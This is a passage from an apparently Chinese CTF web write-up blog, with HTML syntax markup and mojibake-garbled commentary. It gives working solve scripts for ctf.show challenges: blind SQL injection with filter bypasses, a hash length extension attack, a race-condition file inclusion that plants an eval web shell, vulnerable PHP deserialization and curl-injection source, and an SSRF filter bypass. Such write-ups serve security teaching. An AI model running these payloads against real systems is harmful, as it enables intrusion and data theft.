class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="comment">/**/</span><span class="keyword">in</span><span class="comment">/**/</span>(<span class="number">0x77656231</span>)<span class="comment">/**/</span>%<span class="number">26</span>%<span class="number">26</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="keyword">in</span><span class="comment">/**/</span>(<span class="number">0x666c6167</span>))<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))&lt;<span class="number">100</span><span class="comment">/**/</span><span class="keyword">then</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">else</span><span class="comment">/**/</span><span class="number">0</span><span class="comment">/**/</span><span class="keyword">end</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>æœ‰å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼š</p><ul><li><code>and</code>è¿‡æ»¤ç”¨<code>&amp;&amp;</code>éœ€è¦urlç¼–ç </li><li>ç­‰äºå·è¿‡æ»¤ç”¨<code>in</code>,è¦åŠ æ‹¬å·ï¼Œè¿˜å¯ä»¥ç”¨åŒæ—¶ä¸æ»¡è¶³å¤§äºå°äºä¸¤ä¸ªæ¡ä»¶</li><li>å•å¼•å·è¿‡æ»¤ç”¨åå…­è¿›åˆ¶</li><li><code>,</code>è¿‡æ»¤ç”¨<code>from...for</code></li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://196a9ac5-2082-4530-8ae1-6a72f276e86b.chall.ctf.show/index.php?id=&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    f=<span class="number">1</span></span><br><span class="line">    midflag=<span class="number">1</span></span><br><span class="line">    mid=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> f <span class="keyword">and</span> midflag!=mid:</span><br><span class="line">        f=<span class="number">0</span></span><br><span class="line">        midflag=mid</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;(case/**/when/**/ord(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))&lt;&#123;&#125;/**/then/**/1/**/else/**/0/**/end)#&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        p2=<span class="string">&quot;(case/**/when/**/ord(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;/**/then/**/1/**/else/**/0/**/end)#&quot;</span>.format(str(i),str(mid))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.get(url+p1)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;pitch-and-toss,&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">                f=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            r2=requests.get(url+p2)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;pitch-and-toss,&#x27;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">                f=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> f==<span class="number">0</span>:</span><br><span class="line">            flag+=chr(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="easyshell-36Dç»ƒæ‰‹èµ›"><a href="#easyshell-36Dç»ƒæ‰‹èµ›" class="headerlink" title="easyshell_36Dç»ƒæ‰‹èµ›"></a>easyshell_36Dç»ƒæ‰‹èµ›</h3><p>æ˜æ˜¾hashé•¿åº¦æ‰©å±•æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://7270896d-ae34-4a8f-893e-287f6e5a21cc.chall.ctf.show/?&#x27;</span></span><br><span class="line">hsh=<span class="string">&#x27;fc77c20ed2841d8162335eaebb2f3c09&#x27;</span></span><br><span class="line">s1=<span class="string">&#x27;&#x27;&#x27;1&#x27;&#x27;&#x27;</span></span><br><span class="line">s2=<span class="string">&#x27;&#x27;&#x27;admin&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">m=hashpumpy.hashpump(hsh,s1,s2,i)</span><br><span class="line"><span class="comment">#print i</span></span><br><span class="line">name=urllib.quote(urllib.unquote(m[<span class="number">1</span>]))</span><br><span class="line">uri=url+<span class="string">&#x27;name=&#x27;</span>+name+<span class="string">&quot;&amp;pass=&quot;</span>+m[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print uri</span></span><br><span class="line">r=requests.get(uri)</span><br><span class="line"><span class="comment"># print r.text</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="keyword">print</span> r.text;</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>flflflflag.php</code>ï¼Œè®¿é—®ä¼šè·³è½¬ï¼ŒæŠ“åŒ…åœ¨æºç é‡Œå‘ç°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($_GET[&quot;file&quot;])</span><br></pre></td></tr></table></figure><p>å°è¯•åŒ…å«sessionä¸Šä¼ è¿›åº¦getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://7270896d-ae34-4a8f-893e-287f6e5a21cc.chall.ctf.show/flflflflag.php&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=dddd&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span>                                <span class="comment">#ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&#x27;&lt;?php file_put_contents(&quot;/tmp/2&quot;,\&#x27;&lt;?php @eval($_POST[1]);?&gt;\&#x27;);echo &quot;moonback&quot;;?&gt;&#x27;</span>     </span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files=files,headers=headers,data=data)</span><br><span class="line">        <span class="comment"># print(&#x27;[+]POST&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        t=r.get(url+<span class="string">&quot;?file=/tmp/sess_dddd&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;moonback&#x27;</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            <span class="comment"># print(&#x27;[+]retry&#x27;)</span></span><br><span class="line">            print(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=POST,args=()).start()</span><br><span class="line">    threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure><p>èšå‰‘è¿ä¸Šbypass disable_function,flagåœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œè¿™é¢˜å°±æ˜¯NPUCTFåŸé¢˜</p><p>è´´ä¸€ä¸‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@$name=$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@$pass=$_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5($secret.$name)===$pass)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;Hash&quot;</span>,md5($secret.$name),time()+<span class="number">3600000</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h3><h3 id="game-gyctf-web2"><a href="#game-gyctf-web2" class="headerlink" title="game-gyctf web2"></a>game-gyctf web2</h3><p>æ‰«ç›®å½•å‘ç°<code>www.zip</code>ï¼Œä¸»è¦ä»£ç éƒ½åœ¨<code>lib.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;  </span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ çš„IDæ˜¯&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ å¥½ï¼&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//å±</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;å¯†ç é”™è¯¯ï¼&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è¿˜æ²¡æ¥å¾—åŠå†™</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸‹ååºåˆ—åŒ–é“¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper::__destruct() &#x3D;&#x3D;&gt; User::__toString() &#x3D;&#x3D;&gt; Info::__call()  &#x3D;&#x3D;&gt; </span><br></pre></td></tr></table></figure><h3 id="web1è§‚å­—WEB-AKèµ›"><a href="#web1è§‚å­—WEB-AKèµ›" class="headerlink" title="web1è§‚å­—WEB_AKèµ›"></a>web1è§‚å­—WEB_AKèµ›</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag in http://192.168.7.68/flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    $protocol = substr($url, <span class="number">0</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">if</span>($protocol!=<span class="string">&#x27;http://&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ä»…é™httpåè®®è®¿é—®&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\&#x27;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/&#x27;</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;ä»…é™åŸŸååœ°å€è®¿é—®&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&#x27;curl &#x27;</span>.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿ï¼Œç›´æ¥ä¸­æ–‡å¥å·ç»•è¿‡<code>ã€‚</code>ï¼Œpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;192ã€‚168ã€‚7ã€‚68&#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="web3è§‚å›¾WEB-AKèµ›"><a href="#web3è§‚å›¾WEB-AKèµ›" class="headerlink" title="web3è§‚å›¾WEB_AKèµ›"></a>web3è§‚å›¾WEB_AKèµ›</h3><p>æŸ¥çœ‹æºç å‘ç°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showImage.php?image&#x3D;Z6Ilu83MIDw&#x3D;</span><br></pre></td></tr></table></figure><p>å°†imageæ”¹æˆ<code>image[]=</code>æŠ¥é”™ï¼š</p><figure class="highlight 